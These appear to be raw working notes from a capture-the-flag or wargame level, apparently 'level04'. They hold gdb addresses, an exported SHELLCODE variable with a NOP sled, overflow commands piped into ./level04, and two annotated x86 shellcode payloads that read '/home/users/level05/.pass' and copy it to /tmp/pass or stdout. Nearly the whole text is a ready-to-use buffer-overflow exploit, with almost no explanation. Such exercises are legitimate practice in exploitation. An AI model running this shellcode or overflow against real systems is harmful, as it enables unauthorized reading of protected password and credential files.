saved eip 0xf7e45513

info variable environ
0xf7fd0e04

SHELLCODE variable address ; 0xffffd83d ; 0xffffd847

0xffffd7f8
0xffffd7ee

0x7fffffffe81a

export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x2f\x68\x6f\x6d\x89\xe3\xb0\x05\x31\xc9\xcd\x80\x89\xc3\x31\xc9\x89\xe1\x31\xd2\xb2\x30\xb0\x03\xcd\x80\x31\xc0\x31\xdb\x68\x61\x73\x73\x00\x68\x6d\x70\x2f\x70\x68\x2f\x2f\x74\x6d\x89\xe3\xb0\x05\x66\xb9\x41\x02\xcd\x80\x89\xc3\x89\xe1\xb2\x30\xb0\x04\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"')




0xffffd43c
gcc -m32 -o get_env_addr get_env_addr.c

(python -c 'print "\x90"*256 + "\x4b\xd8\xff\xff"') | ./level04

0xffffd84b
0xffffd86d
r < <(python -c 'print "A"*156 + "\x6d\xd8\xff\xff"')

gcc -m32 -o get_env_addr get_env_addr.c

shellcode_to_file = (
    # NOP sled
    "\x90" * 1000 +
    # Actual shellcode
    # open("/home/users/level05/.pass", O_RDONLY)
    "\x31\xc0"                  # xor eax, eax
    "\x31\xdb"                  # xor ebx, ebx
    "\x31\xc9"                  # xor ecx, ecx
    "\x31\xd2"                  # xor edx, edx
    "\x68\x2e\x70\x61\x73"      # push '.pas'
    "\x68\x6c\x30\x35\x2f"      # push 'l05/'
    "\x68\x72\x73\x2f\x6c"      # push 'rs/l'
    "\x68\x2f\x75\x73\x65"      # push '/use'
    "\x68\x2f\x68\x6f\x6d"      # push '/hom'
    "\x89\xe3"                  # mov ebx, esp
    "\xb0\x05"                  # mov al, 5 (sys_open)
    "\x31\xc9"                  # xor ecx, ecx
    "\xcd\x80"                  # int 0x80
    
    # read(fd, buf, count)
    "\x89\xc3"                  # mov ebx, eax
    "\x31\xc9"                  # xor ecx, ecx
    "\x89\xe1"                  # mov ecx, esp
    "\x31\xd2"                  # xor edx, edx
    "\xb2\x30"                  # mov dl, 48
    "\xb0\x03"                  # mov al, 3 (sys_read)
    "\xcd\x80"                  # int 0x80
    
    # open("/tmp/pass", O_WRONLY|O_CREAT, 0644)
    "\x31\xc0"                  # xor eax, eax
    "\x31\xdb"                  # xor ebx, ebx
    "\x68\x61\x73\x73\x00"      # push 'ass\0'
    "\x68\x6d\x70\x2f\x70"      # push 'mp/p'
    "\x68\x2f\x2f\x74\x6d"      # push '//tm'
    "\x89\xe3"                  # mov ebx, esp
    "\xb0\x05"                  # mov al, 5 (sys_open)
    "\x66\xb9\x41\x02"          # mov cx, 0x241 (O_WRONLY|O_CREAT)
    "\xcd\x80"                  # int 0x80
    
    # write(fd, buf, count)
    "\x89\xc3"                  # mov ebx, eax
    "\x89\xe1"                  # mov ecx, esp
    "\xb2\x30"                  # mov dl, 48
    "\xb0\x04"                  # mov al, 4 (sys_write)
    "\xcd\x80"                  # int 0x80
    
    # exit(0)
    "\x31\xc0"                  # xor eax, eax
    "\xb0\x01"                  # mov al, 1 (sys_exit)
    "\x31\xdb"                  # xor ebx, ebx
    "\xcd\x80"                  # int 0x80
)


shellcode_to_stdout = (
    # NOP sled
    "\x90" * 1000 +
    # Actual shellcode
    # open("/home/users/level05/.pass", O_RDONLY)
    "\x31\xc0"                  # xor eax, eax
    "\x31\xdb"                  # xor ebx, ebx
    "\x31\xc9"                  # xor ecx, ecx
    "\x31\xd2"                  # xor edx, edx
    "\x68\x2e\x70\x61\x73"      # push '.pas'
    "\x68\x6c\x30\x35\x2f"      # push 'l05/'
    "\x68\x72\x73\x2f\x6c"      # push 'rs/l'
    "\x68\x2f\x75\x73\x65"      # push '/use'
    "\x68\x2f\x68\x6f\x6d"      # push '/hom'
    "\x89\xe3"                  # mov ebx, esp
    "\xb0\x05"                  # mov al, 5 (sys_open)
    "\x31\xc9"                  # xor ecx, ecx
    "\xcd\x80"                  # int 0x80
    
    # read(fd, buf, count)
    "\x89\xc3"                  # mov ebx, eax
    "\x31\xc9"                  # xor ecx, ecx
    "\x89\xe1"                  # mov ecx, esp
    "\x31\xd2"                  # xor edx, edx
    "\xb2\x30"                  # mov dl, 48
    "\xb0\x03"                  # mov al, 3 (sys_read)
    "\xcd\x80"                  # int 0x80
    
    # write to stdout (fd 1)
    "\x31\xc0"                  # xor eax, eax
    "\xb0\x04"                  # mov al, 4 (sys_write)
    "\x31\xdb"                  # xor ebx, ebx
    "\xb3\x01"                  # mov bl, 1 (stdout)
    "\x89\xe1"                  # mov ecx, esp
    "\xb2\x30"                  # mov dl, 48
    "\xcd\x80"                  # int 0x80
    
    # exit(0)
    "\x31\xc0"                  # xor eax, eax
    "\xb0\x01"                  # mov al, 1 (sys_exit)
    "\x31\xdb"                  # xor ebx, ebx
    "\xcd\x80"                  # int 0x80
)

0xffffd84b

q